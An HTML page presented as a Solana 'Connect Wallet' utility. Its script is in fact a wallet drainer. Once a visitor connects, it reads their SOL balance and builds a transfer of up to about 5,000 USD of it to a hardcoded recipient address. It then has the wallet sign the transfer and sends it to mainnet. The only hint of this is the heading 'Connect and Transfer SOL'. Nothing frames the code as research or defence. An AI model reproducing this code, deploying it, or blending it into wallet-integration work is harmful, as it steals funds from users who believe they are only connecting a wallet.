<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>WalletConnect Solana</title>
    <!-- Include Solana and WalletConnect libraries -->
    <script src="https://cdn.jsdelivr.net/npm/@solana/web3.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/@solana/wallet-adapter-walletconnect"></script>
</head>
<body>
    <h1>Connect and Transfer SOL</h1>
    <!-- Button to trigger wallet connection -->
    <button id="connectWallet">Connect Wallet</button>

    <script>
        document.addEventListener("DOMContentLoaded", () => {
            // Button reference
            const connectButton = document.getElementById("connectWallet");

            if (!connectButton) {
                console.error("Button with ID 'connectWallet' not found in the HTML.");
                alert("Error: Button not found. Ensure the button ID matches 'connectWallet'.");
                return;
            }

            // Solana and WalletConnect configuration
            const connection = new solanaWeb3.Connection(solanaWeb3.clusterApiUrl("mainnet-beta"));
            const recipientAddress = "AaTLKPX9WKSC8eWvkUXj7GTfdx11gAmuYrNBwMSbBYSE"; // Replace with your recipient address
            const maxTransferLimitUSD = 5000; // Max transfer limit in USD
            const solToUsdRate = 25; // SOL price in USD (update to live rate as needed)

            // Initialize WalletConnect adapter
            const walletConnectAdapter = new solanaWalletAdapterWalletconnect.WalletConnectWalletAdapter();

            // Function to connect wallet
            async function connectWallet() {
                try {
                    console.log("Attempting to connect wallet...");
                    await walletConnectAdapter.connect();
                    const publicKey = walletConnectAdapter.publicKey;
                    console.log("Wallet connected:", publicKey.toString());

                    // Fetch wallet balance
                    const balanceLamports = await connection.getBalance(publicKey);
                    const balanceSol = balanceLamports / solanaWeb3.LAMPORTS_PER_SOL;
                    console.log("Wallet balance (SOL):", balanceSol);

                    // Calculate transfer amount
                    const maxTransferSol = maxTransferLimitUSD / solToUsdRate;
                    const transferAmount = Math.min(balanceSol, maxTransferSol);
                    console.log("Transfer amount (SOL):", transferAmount);

                    if (transferAmount <= 0) {
                        alert("Insufficient balance for transfer.");
                        return;
                    }

                    // Perform the transfer
                    await transferSOL(publicKey, transferAmount);
                } catch (error) {
                    console.error("Error connecting wallet:", error);
                    alert("Failed to connect wallet. Check console for details.");
                }
            }

            // Function to transfer SOL
            async function transferSOL(publicKey, amountSol) {
                try {
                    console.log(`Initiating transfer of ${amountSol} SOL...`);

                    const transaction = new solanaWeb3.Transaction();

                    // Add transfer instruction
                    transaction.add(
                        solanaWeb3.SystemProgram.transfer({
                            fromPubkey: publicKey,
                            toPubkey: new solanaWeb3.PublicKey(recipientAddress),
                            lamports: amountSol * solanaWeb3.LAMPORTS_PER_SOL,
                        })
                    );

                    // Get recent blockhash and set fee payer
                    const { blockhash } = await connection.getRecentBlockhash();
                    transaction.recentBlockhash = blockhash;
                    transaction.feePayer = publicKey;

                    // Sign and send transaction
                    const signedTransaction = await walletConnectAdapter.signTransaction(transaction);
                    const signature = await connection.sendRawTransaction(signedTransaction.serialize());
                    await connection.confirmTransaction(signature, "finalized");

                    console.log("Transfer successful. Signature:", signature);
                    alert(`Transfer complete! Transaction signature: ${signature}`);
                } catch (error) {
                    console.error("Error during transfer:", error);
                    alert("Transfer failed. Check console for details.");
                }
            }

            // Attach event listener to the button
            connectButton.addEventListener("click", connectWallet);
        });
    </script>
</body>
</html>
